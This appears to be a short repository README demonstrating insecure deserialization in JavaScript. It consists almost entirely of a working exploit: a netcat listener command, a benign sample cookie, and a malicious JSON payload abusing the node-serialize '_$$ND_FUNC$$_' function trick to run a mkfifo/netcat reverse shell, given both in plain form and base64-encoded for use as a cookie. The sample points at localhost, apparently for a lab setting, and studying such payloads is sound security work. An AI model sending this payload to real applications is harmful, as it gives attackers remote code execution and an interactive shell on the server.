# insecure_deserialization
Sample code of insecure deserialization using JavaScript

$ nc -nvl 4444

{"username":"bill","country":"us","city":"austin"}
eyJ1c2VybmFtZSI6ImJpbGwiLCJjb3VudHJ5IjoidXMiLCJjaXR5IjoiYXVzdGluIn0=

{"username":"_$$ND_FUNC$$_function (){ require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f\", function puts(error, stdout, stderr) {});}()","country":"us","city":"austin"}
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKFwicm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTI3LjAuMC4xIDQ0NDQgPi90bXAvZlwiLCBmdW5jdGlvbiBwdXRzKGVycm9yLCBzdGRvdXQsIHN0ZGVycikge30pO30oKSIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJkZWxoaSJ9
